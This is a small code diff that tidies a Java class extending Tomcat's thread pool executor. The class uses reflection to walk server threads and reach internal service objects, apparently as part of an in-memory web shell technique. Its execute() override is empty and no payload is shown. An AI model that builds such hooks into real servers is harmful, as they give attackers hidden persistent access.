@@ -5,7 +5,6 @@ import org.apache.tomcat.util.net.NioEndpoint;
 import org.apache.tomcat.util.threads.ThreadPoolExecutor;
 
 import java.util.concurrent.BlockingQueue;
-import java.util.concurrent.RejectedExecutionHandler;
 import java.util.concurrent.ThreadFactory;
 import java.util.concurrent.TimeUnit;
 
@@ -33,11 +32,6 @@ public class TEXMSFromThread extends ThreadPoolExecutor {
         super(corePoolSize, maximumPoolSize, keepAliveTime, unit, workQueue, threadFactory, (RejectedExecutionHandler) handler);
     }
 
-
-    @Override
-    public void execute(Runnable command) {
-    }
-
     public static Object getStandardService() throws Exception {
         Thread[] threads = (Thread[]) getFieldValue(Thread.currentThread().getThreadGroup(), "threads");
         for (Thread thread : threads) {
@@ -59,7 +53,6 @@ public class TEXMSFromThread extends ThreadPoolExecutor {
         return new Object();
     }
 
-
     public static Object getFieldValue(Object obj, String fieldName) throws Exception {
         java.lang.reflect.Field f = null;
         if (obj instanceof java.lang.reflect.Field) {
@@ -77,5 +70,9 @@ public class TEXMSFromThread extends ThreadPoolExecutor {
         }
         f.setAccessible(true);
         return f.get(obj);
+    }
+
+    @Override
+    public void execute(Runnable command) {
     }
 }
